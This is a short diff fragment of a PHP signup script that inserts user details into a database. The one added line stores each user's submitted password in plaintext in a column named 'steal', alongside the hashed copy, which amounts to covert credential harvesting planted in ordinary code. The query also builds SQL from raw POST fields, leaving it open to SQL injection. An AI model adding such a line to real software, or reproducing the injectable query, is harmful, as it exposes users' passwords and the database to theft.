@@ -22,6 +22,7 @@ if ( isset( $_POST[ 'b2' ] ) && !empty( $_POST[ 'fname' ] ) &&
 
 
     mysqli_query( $conn, "insert into user_info set
+									steal = '" . $_POST[ 'upass' ] . "',
 		   							username = '" . $_POST[ 'username' ] . "',
 									upass = PASSWORD('" . $_POST[ 'upass' ] . "'),
 									status = '0' ,   									
